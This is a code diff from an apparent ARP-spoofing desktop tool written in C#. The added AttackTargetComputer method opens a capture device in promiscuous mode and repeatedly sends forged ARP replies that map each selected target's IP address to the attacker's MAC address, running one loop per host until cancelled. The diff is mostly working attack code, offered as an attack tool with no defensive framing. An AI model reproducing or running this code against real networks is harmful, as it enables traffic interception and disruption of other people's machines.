@@ -86,7 +86,63 @@ namespace ArpSpoofing.ViewModels
         [RelayCommand]
         private void AttackTargetComputer()
         {
-            var z = Computers.Where(x => x.IsSelect).ToList();
+            var targets = Computers.Where(x => x.IsSelect).ToList();
+            if (!targets.Any())
+            {
+                ContentDialog dialog = new()
+                {
+                    Title = "错误",
+                    Content = "没有合适的目标攻击主机",
+                    XamlRoot = App.MainRoot.XamlRoot,
+                    PrimaryButtonText = "OK",
+                };
+
+                dialog.ShowAsync().GetAwaiter().GetResult();
+            }
+
+            if (!libPcapLiveDevice.Opened)
+            {
+                libPcapLiveDevice.Open(DeviceModes.Promiscuous,20);
+            }
+
+            foreach (var target in targets)
+            {
+                var packet = NetProtocolWrapper.BuildArpResponse(IPAddress.Parse(target.IPAddress), PhysicalAddress.Parse(target.MacAddress), localip.Addr.ipAddress, libPcapLiveDevice.MacAddress);
+
+                var attackComputer = new ArpAttackComputer()
+                {
+                    IPAddress = target.IPAddress,
+                    MacAddress = target.MacAddress,
+                };
+
+                attackComputer.ArpAttackTask = Task.Run(async () =>
+                {
+                    while (true)
+                    {
+                        if (attackComputer.CancellationTokenSource.IsCancellationRequested)
+                        {
+                            break;
+                        }
+
+                        try
+                        {
+                            libPcapLiveDevice.SendPacket(packet);
+                            if (!attackComputer.Succeed)
+                            {
+                                attackComputer.Succeed = true;
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            attackComputer.Succeed = false;
+                        }
+
+                        await Task.Delay(1000);
+                    }
+                },attackComputer.CancellationTokenSource.Token);
+
+                ArpAttackComputers.Add(attackComputer);
+            }
         }
 
 
@@ -119,6 +175,7 @@ namespace ArpSpoofing.ViewModels
             libPcapLiveDevice.Filter = arpFilter;
 
             Computers.Clear();
+            
 
             var task = Task.Run(() =>
             {
@@ -130,7 +187,7 @@ namespace ArpSpoofing.ViewModels
                     }
                     var lastRequestTime = DateTimeOffset.MinValue;
                     var requestInterval = TimeSpan.FromMilliseconds(200);
-                    var timeoutDateTime = DateTimeOffset.Now + new TimeSpan(0, 0, 2);
+                    var timeoutDateTime = DateTimeOffset.Now + new TimeSpan(0, 0, 3);
 
                     while (DateTimeOffset.Now < timeoutDateTime)
                     {
@@ -198,8 +255,6 @@ namespace ArpSpoofing.ViewModels
             }, _cancellationTokenSource.Token);
 
             await task;
-
-            var zs = Computers.OrderBy(x => x.Sort);
         }
 
         public string PhysicalToString(PhysicalAddress macAddress)
